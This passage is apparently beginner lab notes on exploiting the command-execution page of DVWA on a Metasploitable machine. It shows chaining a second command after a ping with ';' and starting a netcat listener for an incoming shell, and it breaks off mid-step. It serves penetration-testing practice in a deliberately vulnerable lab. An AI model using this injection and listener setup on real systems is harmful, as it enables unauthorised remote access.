- When you open the DVWA in your kali bowser with the IP of your metasploitable, go to the code execution section.
- We can execute commands one after another in one go like this : 
```
ping 192.168.14.5 -c 5 ; echo"Hello World"
```
- We can use ; this to give multiple commands at once and they will all execute one by one and there's a way to exploit the code execution section of the DVWA using this method.
- Open command prompt 
```
netcat -lvnp 2345
```
- Search for 